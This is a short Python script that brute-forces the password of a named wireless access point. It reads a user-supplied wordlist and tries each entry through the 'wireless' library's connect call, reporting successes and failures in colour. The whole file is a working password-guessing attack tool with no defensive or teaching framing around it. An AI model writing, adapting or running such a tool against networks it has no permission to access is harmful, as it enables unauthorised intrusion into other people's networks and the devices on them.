from wireless import Wireless
import termcolor

wap_name = str(input('Enter ssid of Wireless Access Point you want to bruteforce: '))
file_path = str(input('Enter path to the file to bruteforce with: '))
print()

wire = Wireless()

try:
    with open(file_path, 'r') as file:
        for line in file.readlines():
            if wire.connect(ssid=wap_name, password=line.strip()) == True:
                print(termcolor.colored(('[+] Wireless Access Point ' + line.strip() + ' - Success!'), 'green'))
            else:
                print(termcolor.colored(('[-] ' + line.strip() + ' - Failed!'), 'red'))
except FileNotFoundError:
    print(termcolor.colored(('[!!] File does not exist.'), 'red'))
except:
    print(termcolor.colored(('[!!] Unhandeld error.'), 'red'))